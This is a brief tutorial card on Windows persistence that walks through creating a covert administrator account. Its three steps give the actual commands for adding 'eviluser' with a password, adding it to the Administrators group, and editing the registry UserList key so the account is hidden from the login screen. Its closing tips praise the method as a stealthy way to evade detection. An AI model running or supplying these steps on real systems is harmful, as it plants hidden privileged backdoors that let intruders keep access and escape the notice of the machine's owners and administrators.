Windows Persistence

Creating Stealthy Hidden Users

Evading Detection in User Management

1

Create New User

Use net user to create a new account with a strong password.

net user eviluser P@ssword123 /add
2

Add to Administrators

Grant the new user administrative privileges for full control.

net localgroup Administrators eviluser /add
3

Hide via Registry

Modify the registry to prevent the user from appearing in login screens and user lists.

Set-ItemProperty -Path "HKLM:\...\UserList" -Name "eviluser" -Value 0 -Type DWord
Common Mistake

Creating a new user but failing to hide it via registry modification makes it easily discoverable by net user or the login screen.

Key Takeaway

Hidden users provide a powerful, stealthy persistence mechanism on Windows, but require careful registry manipulation to remain truly covert.
